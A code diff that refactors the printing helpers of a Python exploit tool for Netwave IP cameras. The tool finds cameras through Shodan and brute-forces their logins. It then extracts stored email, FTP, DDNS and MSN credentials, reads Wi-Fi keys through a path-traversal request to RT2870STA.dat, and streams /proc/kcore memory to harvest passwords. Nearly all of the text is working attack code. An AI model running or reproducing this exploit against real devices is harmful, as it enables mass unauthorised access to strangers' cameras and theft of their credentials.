@@ -7,7 +7,6 @@ import os
 import time
 import subprocess
 import signal
-from colored import attr, fg, stylize
 
 figlet_header = """
      _               _
@@ -22,17 +21,27 @@ try:
     import shodan
     import requests
     import tailer
+    from colored import attr, fg, stylize
 except ImportError as e:
-    print("Error: %s \n" % (e))
-    print("Try this ... pip install -r /path/to/requirements.txt")
+    print("Error: {} \n".format(e))
+    print("Try this ... `pip install -r requirements.txt`")
+
+
+def print_fg_red(s, attr=None):
+    print(stylize(s, fg("red")))
+
+
+def print_fg_yellow(s):
+    print(stylize(s, fg("yellow")))
+
+
+def print_fg_green(s, attr=None):
+    print(stylize(s, fg("green"), attr))
 
 
 def main():
-    print("{}".format(stylize(figlet_header, fg("yellow"))))
-    print(stylize("This tool is successfully connected to shodan service.",
-                  fg("red")))
-    print(stylize("Information the use of this tool is illegal, not bad.",
-                  fg("red")))
+    print_fg_yellow("{}".format(figlet_header))
+    print_fg_red("This tool is successfully connected to shodan service")
 
     parser = argparse.ArgumentParser()
     parser.add_argument(
@@ -129,17 +138,17 @@ def main():
                 args.search, limit=args.limit, offset=args.offset)
             total = api.get('total')
 
-            print(stylize("[+] Shodan successfully Connected.", fg("green")))
-            print(stylize("[+] Netwave Exploit Enabled.", fg("green")))
-            print(stylize("[+] Netwave IP Camera Found: {}".format(total),
-                          fg("green")))
+            print_fg_green("[+] Shodan successfully Connected.")
+            print_fg_green("[+] Netwave Exploit Enabled.")
+            print_fg_green("[+] Netwave IP Camera Found: {}".format(total))
+            usernames = []
 
             if args.username or args.password:
                 usernames = args.username.readlines()
                 passwords = args.password.readlines()
 
-                print(stylize("[+] Passwords loaded: {}".format(
-                    len(passwords)), fg("green")))
+                print_fg_green("[+] Passwords loaded: {}".format(
+                    len(passwords)))
                 pass
 
             ShodanModuleExploit = input(
@@ -148,7 +157,7 @@ def main():
 
             if ShodanModuleExploit.upper(
             ) == "YES" or ShodanModuleExploit.upper() == "Y":
-                print(stylize("[-] Netwave exploit disabled.", fg("red")))
+                print_fg_red("[-] Netwave exploit disabled.")
                 exploit = False
 
             while True:
@@ -166,11 +175,10 @@ def main():
                     try:
 
                         path = "snapshot.cgi"
-                        url = "http://%s:%s/%s" % (host, port, path)
+                        url = "http://{}:{}/{}".format(host, port, path)
 
-                        print(
-                            "[+] Launching brute force on host http://%s:%s" %
-                            (host, port))
+                        print("[+] Launching brute force on host http://{}:{}".
+                              format(host, port))
                         for administrator in usernames:
                             administrator = administrator.strip()
                             for password in passwords:
@@ -195,17 +203,16 @@ def main():
                                     exploit = False
                                     found = True
 
-                                    print(stylize(
+                                    print_fg_green(
                                         "[+] Password Found {}@{}".format(
                                             administrator, password),
-                                        fg("green"), attr("bold")))
-                                    print(stylize(
-                                        "[!] Trying to get more information",
-                                        fg("yellow")))
+                                        attr("bold"))
+                                    print_fg_yellow(
+                                        "[!] Trying to get more information")
 
                                     try:
 
-                                        url = "http://%s:%s/get_params.cgi" % (
+                                        url = "http://{}:{}/get_params.cgi".format(
                                             host, port)
 
                                         headers = {
@@ -284,31 +291,29 @@ def main():
                                                         "'")
                                                     msn_pwd = content[1]
                                             if not (email_user == ''):
-                                                print(stylize(
+                                                print_fg_green(
                                                     "[+] Email: {}:{}".format(
-                                                        email_user, email_pwd),
-                                                    fg("green")))
+                                                        email_user, email_pwd))
                                             if not (ftp_user == ''):
-                                                print(stylize(
+                                                print_fg_green(
                                                     "[+] FTP: ftp://{}:{}@{}:{}".
                                                     format(
                                                         ftp_user, ftp_pwd,
-                                                        ftp_svr, ftp_port)))
+                                                        ftp_svr, ftp_port))
                                             if not (ddns_user == ''):
-                                                print(stylize(
+                                                print_fg_green(
                                                     "[+] DNS: http://{}:{}@{}:{}".
                                                     format(
                                                         ddns_user, ddns_pwd,
                                                         ddns_host,
-                                                        ddns_proxy_svr)))
+                                                        ddns_proxy_svr))
                                             if not (msn_user == ''):
-                                                print(stylize(
+                                                print_fg_green(
                                                     "[+] MSN: {}@{}".format(
-                                                        msn_user, msn_pwd)))
+                                                        msn_user, msn_pwd))
                                     except Exception as e:
-                                        print(stylize(
-                                            "[-] {} not found ".format(url),
-                                            fg("red")))
+                                        print_fg_red(
+                                            "[-] {} not found ".format(url))
                                     break
                                 else:
                                     found = False
@@ -325,20 +330,18 @@ def main():
                                 exploit = False
                             else:
                                 exploit = True
-                                print(stylize("[!] Password not found",
-                                              fg("red"), attr("bold")))
+                                print_fg_red("[!] Password not found",
+                                             attr("bold"))
                     except Exception as e:
-                        print(stylize("[-] {} not found".format(url),
-                                      fg("red")))
+                        print(e)
+                        print_fg_red("[-] {} not found".format(url))
 
-                    print(stylize("[!] Getting System Information",
-                                  fg("yellow")))
-                    print(stylize("[!] Getting Wireless System Information",
-                                  fg("yellow")))
+                    print_fg_yellow("[!] Getting System Information")
+                    print_fg_yellow("[!] Getting Wireless System Information")
 
                     try:
-
-                        wireless = "http://%s:%s/get_status.cgi" % (host, port)
+                        wireless = "http://{}:{}/get_status.cgi".format(
+                            host, port)
                         headers = {
                             'User-Agent':
                             "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36"
@@ -355,26 +358,24 @@ def main():
                                     macaddress = macaddress.split("'")
                                     macaddr = macaddress[1]
 
-                                    print(stylize(
+                                    print_fg_yellow(
                                         "[+] Mac address found {}".format(
-                                            macaddr), fg("yellow")))
+                                            macaddr))
 
                         else:
-                            print(stylize("[-] Getting mac address",
-                                          fg("red")))
+                            print_fg_red("[-] Getting mac address")
                     except Exception as e:
-                        print(stylize("[-] {} not found".format(wireless),
-                                      fg("red")))
+                        print_fg_red("[-] {} not found".format(wireless))
 
                     print(
-                        """[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s"""
-                        % (host, port, country, city, org, product))
+                        """[+] Host: http://{}:{}\n[+] Country: {}\n[+] City: {}\n[+] Organization: {}\n[+] Product: {}""".
+                        format(host, port, country, city, org, product))
 
                     log(host, port, country, city, org, product)
 
                     try:
-
-                        url = "http://%s:%s//etc/RT2870STA.dat" % (host, port)
+                        url = "http://{}:{}//etc/RT2870STA.dat".format(
+                            host, port)
 
                         headers = {
                             'User-Agent':
@@ -394,26 +395,24 @@ def main():
                                             "SSID") != -1:
                                     crendential = crendential.replace(
                                         "=", ": ")
-                                    print(stylize("[+] {}".format(crendential),
-                                                  fg("green"), attr("bold")))
+                                    print_fg_green(
+                                        "[+] {}".format(crendential),
+                                        attr("bold"))
                         else:
-                            print(stylize("[!] Wireless lan is disabled..",
-                                          fg("red"), attr("bold")))
+                            print_fg_red("[!] Wireless lan is disabled..",
+                                         attr("bold"))
                     except Exception as e:
-                        print(stylize("[!] Error: Wireless lan is disabled..",
-                                      fg("red")))
+                        print_fg_red("[!] Error: Wireless lan is disabled..")
 
                     try:
-
-                        url = "http://%s:%s//proc/kcore" % (host, port)
+                        url = "http://{}:{}//proc/kcore".format(host, port)
                         done = 0
                         linecount = 0
 
                         if exploit:
-
-                            print(stylize(
-                                "[+] Starting to read memory dump.. this could take a few minutes",
-                                fg("red")))
+                            print_fg_red(
+                                "[+] Starting to read memory dump.. this could take a few minutes"
+                            )
                             proc = subprocess.Popen(
                                 "wget -qO- " + url + " >> tmpstream.txt",
                                 shell=True,
@@ -424,8 +423,7 @@ def main():
                                 "tail -f tmpstream.txt | strings >>tmpstrings.out",
                                 shell=True,
                                 preexec_fn=os.setsid)
-                            print(stylize("[+] CTRL+C to exit..",
-                                          attr("bold")))
+                            print_fg_red("[+] CTRL+C to exit..", attr("bold"))
 
                             while 1:
                                 sys.stdout.flush()
@@ -446,56 +444,54 @@ def main():
                                             if line == macaddr:
                                                 sys.stdout.flush()
                                                 done = 1
-                                                print(stylize(
-                                                    "[+] Mac address triggered.. printing the following dumps, could leak username and passwords..",
-                                                    fg("green")))
+                                                print_fg_green(
+                                                    "[+] Mac address triggered.. printing the following dumps, could leak username and passwords.."
+                                                )
                                             else:
                                                 sys.stdout.write(
                                                     str(linecount) + "\r")
                                         elif done == 1:
                                             done = 2
-                                            print(stylize(
+                                            print_fg_green(
                                                 "[+] Firstline.. {}".format(
-                                                    line), fg("green")))
+                                                    line))
                                         elif done == 2:
                                             done = 3
-                                            print(stylize(
+                                            print_fg_green(
                                                 "[+] Possible username: {}".
-                                                format(line), fg("gree")))
+                                                format(line))
                                         elif done == 3:
                                             done = 4
-                                            print(stylize(
+                                            print_fg_green(
                                                 "[+] Possible password: {}".
-                                                format(line), fg("green")))
+                                                format(line))
                                         elif done == 4:
                                             done = 0
-                                            print(stylize(
+                                            print_fg_green(
                                                 "[+] Following line..\n\n{}".
-                                                format(line), fg("green")))
+                                                format(line))
                                         else:
                                             pass
                             signal.pause()
                     except:
-                        print(stylize(
-                            "[-] Victim isnt vulnerable for a memory leak, exiting..",
-                            fg("red")))
-                print(stylize("[+] Done!", fg("green")))
+                        print_fg_red(
+                            "[-] Victim isn't vulnerable to memory leak, exiting.."
+                        )
+                print_fg_green("[+] Done!")
                 return True
         except shodan.APIError as e:
-            print(stylize("[-] Error: {}".format(e), fg("red")))
+            print_fg_red("[-] Error: {}".format(e))
             sys.exit(0)
 
     NetworkSearchosts()
 
 
 def log(host, port, country, city, org, product):
-
-    file = open(filename, 'a')
-    out = "[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s\n " % (
-        host, port, country, city, org, product)
-    file.write(out.encode('utf-8'))
-    file.write("*****************" + "\n")
-    file.close()
+    with open(filename, "w+") as f:
+        out = "[+] Host: http://{}:{}\n[+] Country: {}\n[+] City: {}\n[+] Organization: {}\n[+] Product: {}\n ".format(
+            host, port, country, city, org, product)
+        f.write(out)
+        f.write("*****************" + "\n")
 
 
 if __name__ == "__main__":
